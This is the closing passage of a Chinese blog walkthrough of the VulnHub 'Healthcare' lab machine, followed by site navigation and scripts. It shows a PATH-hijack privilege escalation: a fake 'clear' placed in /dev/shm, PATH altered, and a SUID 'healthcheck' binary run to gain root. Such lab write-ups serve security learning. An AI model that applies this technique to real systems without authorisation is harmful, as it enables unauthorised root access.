+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">chmod +x /dev/shm/clear<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>设置 PATH 环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/dev/shm:<span class="hljs-variable">$PATH</span><br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p>运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/usr/bin/healthcheck<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-21-24-37.png" srcset="/img/loading.gif" alt="root"></p>
+<br/>
+
+<h3 id="root-txt"><a href="#root-txt" class="headerlink" title="root.txt"></a>root.txt</h3><br/>
+
+<p><img src="/assets/img/2021_05_15_VulnHub-Healthcare/full_2021-05-14-21-25-08.png" srcset="/img/loading.gif" alt="root.txt"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/VulnHub/">VulnHub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/15/VulnHub-Tiki/">
+                        <span class="hidden-mobile">VulnHub - Tiki</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
